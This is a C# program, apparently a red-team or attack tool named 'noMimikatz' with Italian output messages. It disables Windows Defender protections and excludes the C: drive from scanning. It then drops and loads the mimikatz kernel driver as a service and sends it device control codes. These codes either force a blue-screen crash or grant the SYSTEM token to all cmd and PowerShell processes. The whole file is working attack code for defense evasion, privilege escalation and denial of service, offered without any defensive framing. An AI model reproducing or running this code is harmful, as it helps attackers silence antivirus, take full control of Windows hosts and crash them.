using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using System.Threading;

namespace noMimikatz
{
    internal class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern Microsoft.Win32.SafeHandles.SafeFileHandle CreateFile(
         string lpFileName,
         uint dwDesiredAccess,
         uint dwShareMode,
         IntPtr lpSecurityAttributes,
         uint dwCreationDisposition,
         uint dwFlagsAndAttributes,
         IntPtr hTemplateFile);


        private const uint GENERIC_READ = 0x80000000;
        private const uint GENERIC_WRITE = 0x40000000;
        private const uint OPEN_EXISTING = 3;
        private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
       
        [DllImport("Kernel32.dll", CharSet = CharSet.Auto,SetLastError = true)]
        public static extern bool DeviceIoControl(
                Microsoft.Win32.SafeHandles.SafeFileHandle hDevice, int dwIoControlCode, byte[] InBuffer, int nInBufferSize, byte[] OutBuffer, int nOutBufferSize, ref int pBytesReturned, int pOverlapped);

        public static class IoControlCode //mimidrv ioctl.h
        {
            public const int FILE_DEVICE_UNKNOWN = 0x00000022;
            public const int METHOD_NEITHER = 3;
            public const int FILE_READ_DATA = 0x0001;
            public const int FILE_WRITE_DATA = 0x0002;

            public static int CTL_CODE(int deviceType, int function, int method, int access)
            {
                return ((deviceType << 16) | (access << 14) | (function << 2) | method);
            }

            public static readonly int IOCTL_MIMIDRV_BSOD = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x002, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA);
            public static readonly int IOCTL_MIMIDRV_PROCESS_PROTECT = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x012, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA);
            public static readonly int IOCTL_MIMIDRV_PROCESS_TOKEN = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x011, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA);
        }


        static void Main(string[] args)
        {

            if (args.Length == 0)
            {
                Console.WriteLine("Uso: noMimikatz.exe (options)");
                Console.WriteLine("1 -> esegue bsod");
                Console.WriteLine("2 -> assegna a tutti i processi cmd/powershell il System Token (default)");
                return;
            }


            Console.WriteLine("[+] Creazione del servizio...");
            Process process = new Process();

            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;

            process.StartInfo.Arguments = @"/c powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true";
            Process.Start(process.StartInfo);
            process.StartInfo.Arguments = @"/c powershell Add-MpPreference -ExclusionPath c:\";
            Process.Start(process.StartInfo);
            Thread.Sleep(4000);
            Console.WriteLine("[+] Defender disabilitato.");




            string path = @"c:\mimidrv.sys";
            Console.WriteLine("[+] Creazione del file in " + path);
            try
            {
                byte[] resMimi = Properties.Resources.mimidrv;
                FileStream fs = new FileStream(path, FileMode.CreateNew, FileAccess.Write);

                for (int i = 0; i < resMimi.Length; i++) 
                {
                    fs.WriteByte(resMimi[i]);
                }
                fs.Close();
                Console.WriteLine("[+] File creato in " + path);

            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] File già presente " + path);
                Console.WriteLine("[+] " + ex.Message.ToString());
            }



            process.StartInfo.Arguments = @"/c sc stop mimidrv";
            Process.Start(process.StartInfo);
            Thread.Sleep(2000);
            process.StartInfo.Arguments = @"/c sc delete mimidrv";
            Process.Start(process.StartInfo);
            Thread.Sleep(2000);
            process.StartInfo.Arguments = @"/c sc create mimidrv binPath=" + path + " type=kernel";
            Process.Start(process.StartInfo);
            Thread.Sleep(2000);
            process.StartInfo.Arguments = @"/c sc start mimidrv";
            Process.Start(process.StartInfo);
            Console.WriteLine("[+] Servizio creato, attesa avvio servizio...");
            Thread.Sleep(10000);


            Microsoft.Win32.SafeHandles.SafeFileHandle  handle = CreateFile(@"\\.\mimidrv", GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);

            if (!handle.IsInvalid)
            {
                Console.WriteLine("[+] Handle al driver ottenuto");

                if (args[0] == "1")
                {
                    call_bsod(handle);
                }
                else
                {
                    call_all_token(handle);
                }

                handle.Close();

            }
            else
            {
                Console.WriteLine("[-] Handle al driver non ottenuto");
            }

        }


        private static void call_bsod(Microsoft.Win32.SafeHandles.SafeFileHandle h)
        {
            //https://github.com/gentilkiwi/mimikatz/blob/110a831ebe7b529c5dd3010f9e7fced0d3e3a46c/mimidrv/mimidrv.c#L88
             
            int bytesReturned = 0;

            Console.WriteLine("[+] Invio DeviceIoControl BSOD...");
            Thread.Sleep(2000);
             bool result = DeviceIoControl(h, IoControlCode.IOCTL_MIMIDRV_BSOD, null, 0, null, 0, ref bytesReturned, 0);
           
            if (!result)
            {
                Console.WriteLine("[-] DeviceIoControl BSOD errore.");
            }
            
           
        }


        private static void call_all_token(SafeFileHandle h)
        {

            byte[] kOutputBuffer = new byte[1024];   
            int nOutBufferSize = kOutputBuffer.Length;

            int bytesReturned = 0;

            Console.WriteLine("[+] Invio DeviceIoControl ALL Process Token SYSTEM...");

            bool result = DeviceIoControl(h,
                                  IoControlCode.IOCTL_MIMIDRV_PROCESS_TOKEN, 
                                  null,  
                                  0,
                                  kOutputBuffer,
                                  nOutBufferSize,
                                  ref bytesReturned,
                                  0);

            string asciiString = Encoding.ASCII.GetString(kOutputBuffer);
            Console.WriteLine("bytes: " + bytesReturned + " >> " + asciiString);  

            if (!result)
            {
                Console.WriteLine("[-] DeviceIoControl errore.");
            }
            else
            {
                Console.WriteLine("[+] DeviceIoControl eseguito.");
            }




        }


    }
}
